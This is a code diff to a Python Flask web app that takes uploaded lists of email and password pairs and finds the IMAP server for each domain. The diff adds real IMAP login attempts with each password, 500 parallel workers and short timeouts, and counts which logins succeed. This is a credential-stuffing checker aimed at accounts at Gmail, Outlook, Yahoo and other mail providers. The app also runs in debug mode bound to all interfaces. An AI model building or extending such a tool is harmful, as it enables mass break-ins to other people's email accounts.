@@ -11,6 +11,7 @@ import json
 import threading
 import socket
 import uuid
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 app = Flask(__name__)
 CORS(app)
@@ -89,9 +90,9 @@ def process_emails():
         if file.filename == '':
             return jsonify({'error': 'No file selected'}), 400
         
-        # Get processing parameters
-        timeout = int(request.form.get('timeout', 5))
-        workers = int(request.form.get('workers', 20))
+        # Get processing parameters - optimized defaults for speed
+        timeout = int(request.form.get('timeout', 3))  # Reduced timeout for faster processing
+        workers = int(request.form.get('workers', 500))  # Increased workers for parallel processing
         limit = request.form.get('limit', '')
         limit = int(limit) if limit else None
         
@@ -162,12 +163,14 @@ def process_emails_background(content, process_id, timeout, workers, limit):
             processing_status[process_id]['status'] = 'processing'
             processing_status[process_id]['progress'] = 10
         
-        # Process emails with progress tracking (no file operations)
-        results = process_emails_with_progress_simple(emails, passwords, process_id, timeout)
+        # Process emails with parallel threading for maximum speed
+        results = process_emails_with_progress_parallel(emails, passwords, process_id, timeout, workers)
         
         # Calculate statistics
         successful = len([r for r in results if r.get('imap_server') and r.get('status') == 'success'])
-        failed = total_emails - successful
+        login_failed = len([r for r in results if r.get('imap_server') and r.get('status') == 'login_failed'])
+        server_found = len([r for r in results if r.get('imap_server') and r.get('status') == 'server_found'])
+        failed = len([r for r in results if r.get('status') == 'failed'])
         success_rate = (successful / total_emails * 100) if total_emails > 0 else 0
         
         # Update final status
@@ -179,6 +182,8 @@ def process_emails_background(content, process_id, timeout, workers, limit):
                 'statistics': {
                     'total': total_emails,
                     'successful': successful,
+                    'login_failed': login_failed,
+                    'server_found': server_found,
                     'failed': failed,
                     'success_rate': round(success_rate, 1)
                 }
@@ -190,96 +195,209 @@ def process_emails_background(content, process_id, timeout, workers, limit):
             processing_status[process_id]['status'] = 'error'
             processing_status[process_id]['error'] = f'Processing error: {str(e)}'
 
-def process_emails_with_progress_simple(emails, passwords, process_id, timeout):
-    """Process emails with progress updates - simplified version without file operations"""
+def process_emails_with_progress_parallel(emails, passwords, process_id, timeout, max_workers):
+    """Process emails with parallel threading for optimal speed"""
     results = []
+    processed_count = 0
+    total_emails = len(emails)
     
-    for i, email in enumerate(emails):
+    def process_single_email(email):
+        """Process a single email in parallel"""
         try:
-            # Update progress
-            progress = 10 + (i / len(emails)) * 80  # 10% to 90%
-            with processing_lock:
-                processing_status[process_id]['progress'] = int(progress)
-                processing_status[process_id]['current_email'] = email
-                processing_status[process_id]['processed'] = i
-            
-            # Find IMAP configuration for this email using simplified method
             domain = email.split('@')[1] if '@' in email else ''
             password = passwords.get(email, '')
             
-            # Use simplified IMAP discovery to avoid file I/O issues
-            found_config = find_imap_simple(email, domain, timeout)
+            # Use simplified IMAP discovery with password testing
+            found_config = find_imap_simple(email, domain, timeout, password)
             
             if found_config:
-                results.append({
+                # Determine status based on login verification
+                if found_config.get('login_verified') is True:
+                    status = 'success'
+                elif found_config.get('login_verified') is False:
+                    status = 'login_failed'
+                else:
+                    status = 'server_found'
+                
+                return {
                     'email': email,
                     'domain': domain,
                     'imap_server': found_config['server'],
                     'port': found_config['port'],
                     'password': password,
-                    'status': 'success'
-                })
+                    'status': status,
+                    'login_verified': found_config.get('login_verified')
+                }
             else:
-                # No configuration found
-                results.append({
+                return {
                     'email': email,
                     'domain': domain,
                     'imap_server': '',
                     'port': '',
                     'password': password,
-                    'status': 'failed'
-                })
-                
+                    'status': 'failed',
+                    'login_verified': False
+                }
         except Exception as e:
-            # Handle individual email processing errors
             domain = email.split('@')[1] if '@' in email else ''
-            results.append({
+            return {
                 'email': email,
                 'domain': domain,
                 'imap_server': '',
                 'port': '',
                 'password': passwords.get(email, ''),
                 'status': 'error',
-                'error': str(e)
-            })
-            print(f"Error processing {email}: {e}")
+                'error': str(e),
+                'login_verified': False
+            }
+    
+    # Use ThreadPoolExecutor for parallel processing
+    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        # Submit all email processing tasks
+        future_to_email = {
+            executor.submit(process_single_email, email): email 
+            for email in emails
+        }
+        
+        # Process results as they complete
+        for future in as_completed(future_to_email):
+            email = future_to_email[future]
+            try:
+                result = future.result()
+                results.append(result)
+                processed_count += 1
+                
+                # Update progress more frequently for better UX
+                progress = 10 + (processed_count / total_emails) * 80  # 10% to 90%
+                with processing_lock:
+                    processing_status[process_id]['progress'] = int(progress)
+                    processing_status[process_id]['current_email'] = email
+                    processing_status[process_id]['processed'] = processed_count
+                    
+            except Exception as e:
+                print(f"Error processing {email}: {e}")
+                # Add failed entry
+                domain = email.split('@')[1] if '@' in email else ''
+                results.append({
+                    'email': email,
+                    'domain': domain,
+                    'imap_server': '',
+                    'port': '',
+                    'password': passwords.get(email, ''),
+                    'status': 'error',
+                    'error': str(e)
+                })
+                processed_count += 1
     
     return results
 
-def find_imap_simple(email, domain, timeout):
-    """Simplified IMAP discovery without file operations"""
+def test_imap_connection(host, port, timeout):
+    """Test actual IMAP connection to verify server works"""
+    try:
+        import imaplib
+        if port == 993:
+            # SSL connection
+            with imaplib.IMAP4_SSL(host, port, timeout=timeout) as imap:
+                # Just check if we can connect and get greeting
+                return True
+        else:
+            # Non-SSL connection
+            with imaplib.IMAP4(host, port, timeout=timeout) as imap:
+                return True
+    except Exception as e:
+        return False
+
+def test_imap_login(host, port, email, password, timeout):
+    """Test actual IMAP login with email and password"""
+    try:
+        import imaplib
+        if port == 993:
+            # SSL connection
+            with imaplib.IMAP4_SSL(host, port, timeout=timeout) as imap:
+                # Try to login with credentials
+                imap.login(email, password)
+                return True
+        else:
+            # Non-SSL connection
+            with imaplib.IMAP4(host, port, timeout=timeout) as imap:
+                # Try to login with credentials
+                imap.login(email, password)
+                return True
+    except Exception as e:
+        return False
+
+def find_imap_simple(email, domain, timeout, password=None):
+    """Optimized IMAP discovery with actual IMAP testing and login verification"""
     
-    # Generate candidates
-    candidates = []
+    # Provider-specific fast paths (most reliable)
+    provider_configs = {
+        'gmail.com': [('imap.gmail.com', 993)],
+        'outlook.com': [('imap-mail.outlook.com', 993), ('outlook.office365.com', 993)],
+        'hotmail.com': [('imap-mail.outlook.com', 993)],
+        'live.com': [('imap-mail.outlook.com', 993)],
+        'yahoo.com': [('imap.mail.yahoo.com', 993)],
+        'yahoo.co.uk': [('imap.mail.yahoo.com', 993)],
+        'yahoo.ca': [('imap.mail.yahoo.com', 993)],
+        'aol.com': [('imap.aol.com', 993)],
+        'zoho.com': [('imap.zoho.com', 993)],
+        'mail.com': [('imap.mail.com', 993)],
+        'gmx.com': [('imap.gmx.com', 993)],
+        'web.de': [('imap.web.de', 993)],
+        'peoplepc.com': [('imap.peoplepc.com', 143), ('imap.peoplepc.com', 993)],  # Added peoplepc.com
+    }
     
-    # Add provider-specific patterns first
-    if 'gmail.com' in domain:
-        candidates.append('imap.gmail.com')
-    elif any(x in domain for x in ['outlook.com', 'hotmail.com', 'live.com']):
-        candidates.extend(['imap-mail.outlook.com', 'outlook.office365.com'])
-    elif 'yahoo' in domain:
-        candidates.extend(['imap.mail.yahoo.com', 'imap.yahoo.com'])
-    elif 'aol.com' in domain:
-        candidates.append('imap.aol.com')
-    elif 'zoho.com' in domain:
-        candidates.append('imap.zoho.com')
+    # Road Runner (rr.com) domains use webmail pattern
+    if domain.endswith('.rr.com'):
+        provider_configs[domain] = [(f'webmail.{domain}', 993), (f'imap.{domain}', 993)]
     
-    # Add common patterns
-    candidates.extend([
-        f"imap.{domain}",
-        f"mail.{domain}",
-        f"imap.mail.{domain}",
-        domain
-    ])
-    
-    # Test candidates
-    for host in candidates[:5]:  # Test only first 5 candidates
-        for port in [993, 143]:  # Try SSL first, then non-SSL
+    # Check provider-specific configs first
+    if domain in provider_configs:
+        for host, port in provider_configs[domain]:
             try:
+                # First check if port is open
                 with socket.create_connection((host, port), timeout=timeout):
-                    return {'server': host, 'port': port}
+                    # Then test actual IMAP connection
+                    if test_imap_connection(host, port, timeout):
+                        # If password provided, test login
+                        if password:
+                            if test_imap_login(host, port, email, password, timeout):
+                                return {'server': host, 'port': port, 'login_verified': True}
+                            else:
+                                return {'server': host, 'port': port, 'login_verified': False}
+                        else:
+                            return {'server': host, 'port': port, 'login_verified': None}
             except:
                 continue
+    
+    # Generic patterns (prioritized by likelihood)
+    generic_patterns = [
+        (f"imap.{domain}", 993),
+        (f"imap.{domain}", 143),
+        (f"mail.{domain}", 993),
+        (f"mail.{domain}", 143),
+        (f"webmail.{domain}", 993),  # Added webmail pattern for Road Runner and others
+        (f"webmail.{domain}", 143),
+        (domain, 993),
+        (domain, 143),
+    ]
+    
+    # Test generic patterns
+    for host, port in generic_patterns:
+        try:
+            # First check if port is open
+            with socket.create_connection((host, port), timeout=timeout):
+                # Then test actual IMAP connection
+                if test_imap_connection(host, port, timeout):
+                    # If password provided, test login
+                    if password:
+                        if test_imap_login(host, port, email, password, timeout):
+                            return {'server': host, 'port': port, 'login_verified': True}
+                        else:
+                            return {'server': host, 'port': port, 'login_verified': False}
+                    else:
+                        return {'server': host, 'port': port, 'login_verified': None}
+        except:
+            continue
     
     return None
 
@@ -312,9 +430,9 @@ def process_text_emails():
         if not email_text.strip():
             return jsonify({'error': 'Email text is empty'}), 400
         
-        # Get processing parameters
-        timeout = int(data.get('timeout', 5))
-        workers = int(data.get('workers', 20))
+        # Get processing parameters - optimized defaults for speed
+        timeout = int(data.get('timeout', 3))  # Reduced timeout for faster processing
+        workers = int(data.get('workers', 500))  # Increased workers for parallel processing
         limit = data.get('limit')
         limit = int(limit) if limit else None
         
@@ -405,6 +523,7 @@ if __name__ == '__main__':
     print("\n💻 Server running at: http://localhost:5000")
     print("🌐 Open this URL in your web browser\n")
     
-    app.run(debug=True, host='0.0.0.0', port=5000)
+    app.run(debug=True, host='0.0.0.0', port=5001)
+
 
 
